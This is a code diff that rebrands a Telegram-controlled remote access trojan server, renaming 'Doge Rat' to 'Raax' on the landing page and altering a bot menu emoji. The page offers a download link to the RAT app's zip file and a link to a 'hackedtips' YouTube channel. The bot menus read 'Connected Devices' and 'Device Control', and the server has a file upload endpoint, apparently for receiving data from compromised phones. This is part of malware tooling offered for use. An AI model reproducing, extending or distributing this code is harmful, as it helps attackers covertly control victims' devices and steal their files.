@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">🐶 Doge Rat Application 🚀</h1> <br> <p style="font-size:16px; text-align:center; color:red;">Doge Rat App ➜ <a style="text-decoration: none;" href="https://github.com/Master-xyx/FreeApp/raw/refs/heads/main/DogeApps.zip">Download</a></p> <br><br> <p style="font-size:36px; text-align:center; color:red;">Subscribe 🔔 ➜ <a style="color:green; text-decoration: none;" href="https://youtube.com/@hackedtips">My YT Channel</a></p>')
+    res.send('<h1 align="center">🐶 Raax Application 🚀</h1> <br> <p style="font-size:16px; text-align:center; color:red;">Raax App ➜ <a style="text-decoration: none;" href="https://github.com/Master-xyx/FreeApp/raw/refs/heads/main/DogeApps.zip">Download</a></p> <br><br> <p style="font-size:36px; text-align:center; color:red;">Subscribe 🔔 ➜ <a style="color:green; text-decoration: none;" href="https://youtube.com/@hackedtips">My YT Channel</a></p>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
@@ -517,7 +517,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
+                    "keyboard": [[" 🔥 Connected Devices"], ["🔧 Device Control"]],
                     'resize_keyboard': true
                 }
             }
